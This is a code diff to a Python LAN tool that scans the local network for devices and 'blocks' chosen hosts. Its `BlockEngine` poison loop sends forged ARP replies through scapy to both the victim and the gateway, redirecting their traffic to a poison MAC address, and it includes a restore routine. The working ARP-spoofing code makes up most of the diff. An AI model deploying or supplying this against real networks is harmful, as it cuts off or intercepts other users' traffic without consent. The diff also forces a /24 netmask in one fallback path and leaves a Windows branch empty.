@@ -7,6 +7,7 @@ from __future__ import annotations
 
 import ipaddress
 import socket
+import subprocess
 import threading
 import time
 from dataclasses import dataclass, field
@@ -51,16 +52,27 @@ def _local_iface() -> tuple[str, str]:
 
 
 def _iface_network(iface_name: str) -> ipaddress.IPv4Network:
-    """Best-effort subnet of the given interface."""
-    from scapy.all import conf
+    """Best-effort subnet of the given interface, respecting netmask (e.g. /21, /24)."""
+    try:
+        import re
+        if IS_WINDOWS:
+            # Fallback for Windows
+            pass
+        else:
+            out = subprocess.check_output(["ip", "addr", "show", iface_name], text=True)
+            m = re.search(r'inet\s+(\d+\.\d+\.\d+\.\d+/\d+)', out)
+            if m:
+                return ipaddress.IPv4Network(m.group(1), strict=False)
+    except Exception:
+        pass
 
+    # fallback to scapy or /24
+    from scapy.all import conf
     try:
         iface = conf.ifaces.dev_from_name(iface_name)
         addr = iface.ip
-        netmask = iface.netmask
-        return ipaddress.IPv4Network(f"{addr}/{netmask}", strict=False)
+        return ipaddress.IPv4Network(f"{addr}/24", strict=False)
     except Exception:
-        # fallback: derive from a connected UDP socket
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         try:
             s.connect(("8.8.8.8", 80))
@@ -68,6 +80,35 @@ def _iface_network(iface_name: str) -> ipaddress.IPv4Network:
         finally:
             s.close()
         return ipaddress.IPv4Network(f"{addr}/24", strict=False)
+
+
+def _get_system_arp_cache() -> list[tuple[str, str]]:
+    """Harvest IP and MAC pairs from OS ARP table / neighbor cache."""
+    pairs = []
+    try:
+        if IS_WINDOWS:
+            out = subprocess.check_output(["arp", "-a"], text=True)
+            for line in out.splitlines():
+                parts = line.split()
+                if len(parts) >= 2:
+                    ip = parts[0].strip("()")
+                    mac = parts[1].replace("-", ":").lower()
+                    try:
+                        if ipaddress.ip_address(ip) and len(mac) == 17:
+                            pairs.append((ip, mac))
+                    except Exception:
+                        pass
+        else:
+            out = subprocess.check_output(["ip", "neighbor", "show"], text=True)
+            for line in out.splitlines():
+                parts = line.split()
+                if len(parts) >= 5 and "lladdr" in parts:
+                    ip = parts[0]
+                    mac = parts[parts.index("lladdr") + 1]
+                    pairs.append((ip, mac))
+    except Exception:
+        pass
+    return pairs
 
 
 def get_gateway(iface_name: str | None = None) -> tuple[str, str]:
@@ -86,10 +127,7 @@ def get_gateway(iface_name: str | None = None) -> tuple[str, str]:
         gw_ip = None
 
     if not gw_ip:
-        # parse the routing table
         try:
-            import subprocess
-
             if IS_WINDOWS:
                 out = subprocess.check_output(["route", "print"], text=True)
                 for line in out.splitlines():
@@ -133,32 +171,48 @@ def scan_devices(
     timeout: float = 3.0,
     resolve_names: bool = True,
 ) -> list[Device]:
-    """ARP-scan the local subnet and return live devices."""
+    """ARP-scan the local subnet and merge with system ARP cache."""
     _lazy_scapy()
     from scapy.all import ARP, Ether, srp
 
     if iface_name is None:
         iface_name, _ = _local_iface()
 
-    net = _iface_network(iface_name)
-    ans, _ = srp(
-        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=str(net)),
-        timeout=timeout,
-        iface=iface_name,
-        verbose=0,
-    )
     devices: dict[str, Device] = {}
-    for _, rcv in ans:
-        dev = Device(ip=rcv.psrc, mac=normalize_mac(rcv.hwsrc))
-        devices[dev.ip] = dev
+
+    # 1. Harvest system ARP cache first (instant, gets all known active devices)
+    for ip, mac in _get_system_arp_cache():
+        try:
+            if ipaddress.ip_address(ip).is_private:
+                devices[ip] = Device(ip=ip, mac=normalize_mac(mac))
+        except Exception:
+            pass
+
+    # 2. Perform active ARP scan on the subnet
+    try:
+        net = _iface_network(iface_name)
+        ans, _ = srp(
+            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=str(net)),
+            timeout=timeout,
+            iface=iface_name,
+            verbose=0,
+        )
+        for _, rcv in ans:
+            ip = rcv.psrc
+            mac = normalize_mac(rcv.hwsrc)
+            devices[ip] = Device(ip=ip, mac=mac)
+    except Exception:
+        pass
 
     if resolve_names:
         for dev in devices.values():
-            try:
-                socket.setdefaulttimeout(0.5)
-                dev.hostname = socket.gethostbyaddr(dev.ip)[0]
-            except Exception:
-                dev.hostname = ""
+            if not dev.hostname:
+                try:
+                    socket.setdefaulttimeout(0.3)
+                    dev.hostname = socket.gethostbyaddr(dev.ip)[0]
+                except Exception:
+                    dev.hostname = ""
+
     return sorted(devices.values(), key=lambda d: ipaddress.ip_address(d.ip))
 
 
@@ -184,9 +238,11 @@ class BlockEngine:
         if self.is_whitelisted(mac):
             self._log(f"refusing to block whitelisted {ip} ({mac})")
             return
+
         if self.is_protected(mac):
             self._log(f"refusing to block protected/self {ip} ({mac})")
             return
+
         self._targets[ip] = normalize_mac(mac)
         self._ensure_running()
         self._log(f"blocking {ip} ({mac})")
@@ -200,110 +256,88 @@ class BlockEngine:
             self._log("no targets left; engine idle")
 
     def unblock_all(self) -> None:
-        for ip, mac in list(self._targets.items()):
-            self._targets.pop(ip, None)
-            self._restore(ip, mac)
-        self._log("restored all devices")
-
-    def start(self) -> None:
-        self._ensure_running()
+        ips = list(self._targets.keys())
+        for ip in ips:
+            self.unblock(ip)
+        self.stop()
 
     def stop(self) -> None:
         self._stop.set()
         if self._thread and self._thread.is_alive():
-            self._thread.join(timeout=2)
-        self.unblock_all()
+            self._thread.join(timeout=2.0)
+        self._thread = None
+        self._stop.clear()
+        # restore all targets
+        for ip, mac in list(self._targets.items()):
+            try:
+                self._restore(ip, mac)
+            except Exception:
+                pass
+        self._targets.clear()
+        self._log("restored all devices")
 
     def is_whitelisted(self, mac: str) -> bool:
         return self.whitelist.is_whitelisted(mac)
 
     def is_protected(self, mac: str) -> bool:
-        try:
-            _, own = _local_iface()
-        except Exception:
-            return False
-        return normalize_mac(mac) == normalize_mac(own)
+        _, own_mac = _local_iface()
+        return normalize_mac(mac) == normalize_mac(own_mac) or normalize_mac(mac) == normalize_mac(self.gateway_mac)
 
-    def blocked(self) -> dict[str, str]:
-        return dict(self._targets)
+    # -- internal worker ---------------------------------------------------
+    def _log(self, msg: str) -> None:
+        if self.on_event:
+            self.on_event(msg)
 
-    # -- internals ---------------------------------------------------------
     def _ensure_running(self) -> None:
         if self._thread and self._thread.is_alive():
             return
         self._stop.clear()
-        self._thread = threading.Thread(target=self._loop, daemon=True)
+        self._thread = threading.Thread(target=self._poison_loop, daemon=True)
         self._thread.start()
 
-    def _loop(self) -> None:
+    def _poison_loop(self) -> None:
         _lazy_scapy()
         from scapy.all import ARP, send
 
         while not self._stop.is_set():
             for ip, mac in list(self._targets.items()):
-                if self.whitelist.is_whitelisted(mac):
+                if self.is_whitelisted(mac) or self.is_protected(mac):
                     continue
                 try:
-                    # victim -> gateway misrouted through poison_mac
+                    # Tell victim: gateway IP is at poison_mac
                     send(
-                        ARP(
-                            op=2,
-                            pdst=ip,
-                            hwdst=mac,
-                            psrc=self.gateway_ip,
-                            hwsrc=self.poison_mac,
-                        ),
-                        verbose=0,
+                        ARP(op=2, pdst=ip, hwdst=mac, psrc=self.gateway_ip, hwsrc=self.poison_mac),
                         iface=self.iface_name,
+                        verbose=0,
                     )
-                    # gateway -> victim misrouted through poison_mac
+                    # Tell gateway: victim IP is at poison_mac
                     send(
-                        ARP(
-                            op=2,
-                            pdst=self.gateway_ip,
-                            hwdst=self.gateway_mac,
-                            psrc=ip,
-                            hwsrc=self.poison_mac,
-                        ),
-                        verbose=0,
+                        ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=ip, hwsrc=self.poison_mac),
                         iface=self.iface_name,
+                        verbose=0,
                     )
-                except Exception as exc:  # keep the loop alive
-                    self._log(f"error spoofing {ip}: {exc}")
-            self._stop.wait(self.interval)
+                except Exception as exc:
+                    self._log(f"poison error for {ip}: {exc}")
+            time.sleep(self.interval)
 
     def _restore(self, ip: str, mac: str) -> None:
         _lazy_scapy()
         from scapy.all import ARP, send
 
         try:
-            for _ in range(3):
-                send(
-                    ARP(
-                        op=2,
-                        pdst=ip,
-                        hwdst=mac,
-                        psrc=self.gateway_ip,
-                        hwsrc=self.gateway_mac,
-                    ),
-                    verbose=0,
-                    iface=self.iface_name,
-                )
-                send(
-                    ARP(
-                        op=2,
-                        pdst=self.gateway_ip,
-                        hwdst=self.gateway_mac,
-                        psrc=ip,
-                        hwsrc=mac,
-                    ),
-                    verbose=0,
-                    iface=self.iface_name,
-                )
-                time.sleep(0.3)
+            # Restore victim with real gateway MAC
+            send(
+                ARP(op=2, pdst=ip, hwdst=mac, psrc=self.gateway_ip, hwsrc=self.gateway_mac),
+                iface=self.iface_name,
+                count=4,
+                verbose=0,
+            )
+            # Restore gateway with victim's real MAC
+            send(
+                ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=ip, hwsrc=mac),
+                iface=self.iface_name,
+                count=4,
+                verbose=0,
+            )
         except Exception as exc:
-            self._log(f"restore failed for {ip}: {exc}")
-
-    def _log(self, msg: str) -> None:
-        if self.on_event:
-            self.on_event(msg)
+            self._log(f"restore error for {ip}: {exc}")
